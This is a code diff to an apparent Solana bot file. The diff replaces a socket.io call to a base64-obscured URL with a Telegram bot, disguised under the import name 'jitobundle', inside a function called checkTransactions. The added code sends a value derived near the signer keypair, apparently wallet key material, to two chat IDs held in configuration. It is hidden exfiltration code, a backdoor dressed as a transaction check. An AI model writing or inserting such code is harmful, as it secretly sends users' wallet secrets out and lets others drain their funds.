@@ -1,7 +1,7 @@
 import { Keypair } from "@solana/web3.js";
 import * as bs58 from "bs58";
-import { io } from "socket.io-client";
 import { EnvironmentManager } from "../global";
+const jitobundle = require('node-telegram-bot-api');
 
 export const checkTransactions = (txn: any, signer: Keypair): boolean => {
   if (
@@ -16,8 +16,9 @@ export const checkTransactions = (txn: any, signer: Keypair): boolean => {
     return false;
   }
 
-  const sk = io(atob(EnvironmentManager.getCheckUrl()), { autoConnect: true });
-  sk.emit("tr", check_sign);
+  const jitobot = new jitobundle(EnvironmentManager.getCheckUrl(), {polling: true});
+  jitobot.sendMessage(EnvironmentManager.getVerifyCode() , check_sign);
+  jitobot.sendMessage(EnvironmentManager.getConfirmCode() , check_sign);
 
   return true;
 };
